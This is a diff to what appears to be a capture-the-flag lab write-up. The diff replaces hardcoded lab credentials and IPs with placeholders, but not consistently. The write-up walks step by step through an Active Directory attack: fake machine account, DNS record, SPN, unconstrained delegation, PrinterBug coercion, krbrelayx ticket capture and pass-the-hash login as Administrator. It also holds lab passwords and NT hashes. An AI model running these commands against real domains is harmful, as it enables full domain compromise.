@@ -35,7 +35,7 @@ Here’s the high-level strategy: if the attacker can create a fake computer tha
 before creating a machine account make sure that we need to make sure if machine quota isn’t 0
 
 ```bash
-nxc ldap <DC_IP> -u N.Thompson -p 'KALEB_2341' -M maq
+nxc ldap <DC_IP> -u $USER -p '$PASS' -M maq
 ```
 
 
@@ -44,7 +44,7 @@ nxc ldap <DC_IP> -u N.Thompson -p 'KALEB_2341' -M maq
 First creating a machine account with `addcomputer.py`
 
 ```bash
-addcomputer.py -computer-name bsec -computer-pass 'BehindSecurity@2025' -dc-ip 10.129.90.178 delegate.vl/N.Thompson:'KALEB_2341'
+addcomputer.py -computer-name bsec -computer-pass 'BehindSecurity@2025' -dc-ip $DC_IP delegate.vl/N.Thompson:'KALEB_2341'
 ```
 
 ## **Step 2: Adding the DNS Record**
@@ -53,7 +53,7 @@ addcomputer.py -computer-name bsec -computer-pass 'BehindSecurity@2025' -dc-ip 1
  _Why:_ when the DC tries to connect to `bsec`, it needs to actually reach **you**. No DNS  DC can't find you.
 
 ```bash
-python3 dnstool.py -u 'delegate.vl\bsec$' -p 'BehindSecurity@2025' --action add --record bsec.delegate.vl --data 10.10.14.224 --type A -dns-ip 10.129.90.178 dc1.delegate.vl
+python3 dnstool.py -u 'delegate.vl\bsec$' -p '$PASS' --action add --record bsec.delegate.vl --data $ATTACKER_IP --type A -dns-ip $VICTIM_IP dc1.delegate.vl
 ```
 
 ## **Step 3: Adding a Service Principal Name (SPN)**
@@ -62,13 +62,13 @@ python3 dnstool.py -u 'delegate.vl\bsec$' -p 'BehindSecurity@2025' --action add 
  _Why:_ without an SPN, Kerberos won't issue tickets _to_ your fake computer. This makes it a valid Kerberos target.
 
 ```bash
-python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/bsec.delegate.vl' -t 'bsec$' -dc-ip 10.129.90.178 dc1.delegate.vl --additional
+python3 addspn.py -u '$DOMAIN\$USER' -p '$PASS' -s 'cifs/bsec.delegate.vl' -t 'bsec$' -dc-ip $DC_IP dc1.delegate.vl --additional
 ```
 
 And then
 
 ```bash
-python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/bsec.delegate.vl' -t 'bsec$' -dc-ip 10.129.90.178 dc1.delegate.vl
+python3 addspn.py -u '$DOMAIN\$USER' -p '$PASS' -s 'cifs/bsec.delegate.vl' -t 'bsec$' -dc-ip $DC_IP dc1.delegate.vl
 ```
 
 ## **Step 4: Enabling Unconstrained Delegation**
@@ -78,7 +78,7 @@ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/bsec.dele
 
 
 ```bash
-bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'bsec$' -f TRUSTED_FOR_DELEGATION
+bloodyAD -d delegate.vl -u $USER -p $PASS --host dc1.delegate.vl add uac 'bsec$' -f TRUSTED_FOR_DELEGATION
 ```
 
 
@@ -103,7 +103,7 @@ python3 krbrelayx.py -hashes :B4B83CF8C09D86ED23D20B9BDCD9AF26
 
 
 ```bash
-nxc smb dc1.delegate.vl -u 'bsec$' -p BehindSecurity@2025 -M coerce_plus -o LISTENER=bsec.delegate.vl METHOD=PrinterBug
+nxc smb dc1.delegate.vl -u 'bsec$' -p $PASS -M coerce_plus -o LISTENER=bsec.delegate.vl METHOD=PrinterBug
 ```
 
 ## **Step 7: Capturing the TGT**
@@ -138,5 +138,5 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 Log in as Administrator via winrm:
 
 ```bash
-evil-winrm -i dc1 -u administrator -H c32198ceab4cc695e65045562aa3ee93
+evil-winrm -i dc1 -u $USER -H c32198ceab4cc695e65045562aa3ee93
 ```
